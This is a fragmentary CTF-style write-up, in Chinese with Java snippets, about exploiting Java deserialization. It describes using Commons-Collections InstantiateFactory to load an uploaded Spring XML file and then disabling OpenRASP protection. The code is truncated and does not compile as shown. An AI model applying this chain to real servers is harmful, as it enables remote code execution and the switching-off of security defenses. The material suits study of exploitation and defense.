    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);

            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());

    public static void deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);

        ois.readObject();
        ois.close();

所以主要是如何绕过openrasp

cc能饶过，用InstantiateFactory和FactoryTransformer来绕过

InstantiateFactory能够任意类实例化

在正常的cc中是实例化TrAXFilter能够Templateimpl加载字节码

但TemplateImpl被ban了

所以可以实例化spring中常用的ClassPathXmlApplicationContext去加载xml文件

不过这里不出网，并且题目给了上传文件的路由，可以传上去然后加载

ClassPathXmlApplicationContext：从类路径中加载XML文件。
FileSystemXmlApplicationContext：从文件系统中加载XML文件。

说是这样说，其实都可以用

不过仅靠这些并不能达到最终的利用，因为都是要解决命令执行的问题

这里可以参考y4大佬文章，关掉openrasp

Class<?> clz = Thread.currentThread().getContextClassLoader().loadClass("com.baidu.openrasp.config.Config");
